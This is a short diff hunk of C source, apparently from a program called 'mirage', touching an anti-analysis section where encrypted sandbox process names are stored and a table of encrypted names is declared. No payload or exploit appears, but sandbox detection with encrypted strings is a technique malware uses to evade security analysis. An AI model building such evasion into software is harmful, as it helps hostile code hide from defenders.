@@ -55,8 +55,11 @@ int mirage_anti_analysis_should_exit(mirage_analysis_result result) {
 
 #ifdef ENABLE_ANTI_ANALYSIS
 
-/* ── Encrypted process names: moved to include/enc_strings.h (Phase 4) ── */
+/* Sandbox process names: enc_strings.h (restored, key-consistent)
+ * arrays — the previous local copies used a stale key pipeline and
+ * decrypted to garbage. */
 
+/* Table of encrypted process names and their lengths */
 typedef struct {
     const uint8_t *enc;
     size_t         len;
